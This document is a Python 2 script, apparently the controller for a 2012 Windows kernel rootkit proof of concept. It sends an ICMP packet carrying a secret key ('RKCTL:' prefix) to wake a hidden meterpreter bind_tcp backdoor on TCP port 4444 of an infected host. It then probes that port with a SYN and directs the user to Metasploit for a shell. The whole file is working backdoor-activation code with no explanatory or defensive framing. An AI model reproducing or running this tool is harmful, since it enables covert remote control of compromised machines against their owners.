#####################################################################
#
# Windows kernrel rootkit PoC using registry values processing BoF.
#
# Script for meterpreter/bind_tcp backdoor activation on TCP/4444 
# port of infected target.
# 
# (c) 2012, Oleksiuk Dmytro (aka Cr4sh)
# cr4sh@riseup.net
#
#####################################################################

import sys, os
from optparse import OptionParser

BACKDOOR_PORT_NUMBER = 4444
TIMEOUT = 5

try:

    # import scapy stuff
    from scapy.all import *

except Exception, why:

    print "[!] Exception while importing module: " + str(why)
    print "[!] Scapy (http://www.secdev.org/projects/scapy/) is not installed?"
    sys.exit()

if __name__ == '__main__':

    print "***********************************************************\n"
    print " Windows kernrel rootkit PoC using registry values processing BoF.\n"
    print " (c) 2012 Oleksiuk Dmytro (aka Cr4sh)"
    print " cr4sh@riseup.net\n"
    print "***********************************************************\n"

    parser = OptionParser()

    parser.add_option("-k", "--key", dest = "key", default = None,
        help = "Rootkit secret key.")

    parser.add_option("-d", "--dst", dest = "dst", default = None,
        help = "Destination host IP address.")

    # parse command line
    (options, args) = parser.parse_args()

    if options.key is None or options.dst is None:

        print "[!] Please specify --dst and --key options"
        sys.exit()

    print "[+] Destination host IP address: ", options.dst
    print "[+] Rootkit secret key: ", options.key
    print "[+] Backdoor port: ", str(BACKDOOR_PORT_NUMBER)

    # allocate IP + ICMP packets
    ip = IP(dst = options.dst)
    icmp = ICMP(type = 8, code = 0)
    data = "RKCTL:" + options.key

    # send it over the network
    sr1(ip/icmp/data, timeout = TIMEOUT)    

    # scan for opened backdoor port
    ip = IP(dst = options.dst)
    TCP_SYN = TCP(sport = RandShort(), dport = int(BACKDOOR_PORT_NUMBER), flags = 'S', seq = 40) 
    
    # send SYN packet and wait for the first reply
    TCP_SYNACK = sr1(ip/TCP_SYN, timeout = 1) 
    
     # SEQ Number for SYN-ACK
    if not TCP_SYNACK or TCP_SYNACK.getlayer(TCP).flags != 0x12:

        # response from our target aka hostip - expect RST
        print "[+] Port %d is closed" % BACKDOOR_PORT_NUMBER
    
    else:
        
        print "[+] Port %d is opened, use Metasploit for connection to meterpreter/bind_tcp" % BACKDOOR_PORT_NUMBER
        print "[+] It will be closed immediately after 'exit' command in meterpreter shell"

# if end

#
# EoF
#
